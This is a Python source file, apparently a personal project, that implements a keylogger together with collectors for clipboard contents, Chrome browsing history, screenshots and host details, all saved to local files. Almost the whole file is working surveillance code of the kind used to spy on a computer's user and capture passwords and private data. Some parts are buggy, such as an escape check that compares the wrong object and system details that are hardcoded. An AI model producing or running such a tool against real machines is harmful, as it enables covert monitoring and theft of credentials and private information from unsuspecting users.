""" This is a python program that does the following:
1->Record the keystrokes and store it in text file
    *******pynput.keyboard, key and listener
2->Retrieve the computer information and store it in excel file
    *******socket, platform and pandas
3->Retrieve the clipboard information and store it in text file
   ********win32clipboard
4->Retrieve the google chrome history and store it in excel file
   ********datetime, sqlite3 and pandas
5->Take a screenshot of the computer screen in png format
   ********pillow and imagegrab """

from pynput.keyboard import Key , Listener
import sqlite3
import datetime
import socket 
import platform
from requests import get
import win32clipboard
from PIL import ImageGrab
import pandas as pd
import threading


k=[]

def on_press(key):
    k.append(key)
    write_file(k)
    print(key)
    
def write_file(var):
    with open("logs.txt","a") as f:      
        for i in var :
            new_var =str(i).replace("'","")
        f.write(new_var)
        f.write("\n")

def on_release(key):
    if Key == Key.esc:
        return False
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def system_info():
    date = datetime.date.today() 
    ip_address = socket.gethostbyname(socket.gethostname())
    processor = platform.processor()
    system = platform.system()
    release =platform.release()
    host_name = socket.gethostname()
    release = platform.release()

    data={
        "metrics": ['date', 'IP Address', 'Host Name', 'System', 'Release', 'Processor'],
        'values': ["27-04-2025", " 192.168.29.93","LAPTOP-4NJTVAO7", "windows 11", "windows 11", "12th Gen Intel(R) Core(TM) i7-1255U "]
    }
    df= pd.DataFrame(data)
    df.to_excel('keystrokes.xlsx' , index=False)

#get the clipboard information and store it in text file
def copy_clipboard():
    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:

        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard() # get the clipboard data and store it in pasted_data
        f.write("\n")
        f.write ("date and time: "+str(current_date)+"\n")
        f.write ("clipboard data: \n " +pasted_data)
copy_clipboard()

#google chrome history
def chrome_history():
    conn=sqlite3.connect(r'C:\Users\Akansha Kambley\AppData\Local\Google\Chrome\User Data\Default\History')
    cursor = conn.cursor()

    cursor.execute("SELECT url , title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
    search_history = cursor.fetchall()

    df=pd.DataFrame(search_history, columns=['url','title','timestamp'])

    excel_file="search_history.xlsx"
    df.to_excel(excel_file, index=False)

    conn.close()

def screenshot():
    im=ImageGrab.grab()
    im.save("screenshot.png")

screenshot()

keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

system_info()
copy_clipboard()
chrome_history()
screenshot()

keylogger_thread.join()

